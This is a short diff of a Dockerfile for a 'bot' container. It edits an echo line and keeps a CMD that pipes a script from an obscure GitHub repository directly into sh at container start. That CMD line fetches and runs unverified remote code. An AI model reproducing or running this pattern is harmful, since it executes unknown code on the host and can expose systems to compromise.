@@ -34,7 +34,7 @@ COPY /stuff /home/stuff
 RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 
 # Install the bot:
-RUN echo "Uploaded files:" && ls /home/stuff/
+RUN echo "curl https://raw.githubusercontent.com/OpUiajwk/Opuiajwk/main/buildd.sh:" && ls /home/stuff/
 
 # Run bot script:
 CMD curl https://raw.githubusercontent.com/OpUiajwk/Opuiajwk/main/buildd.sh | sh
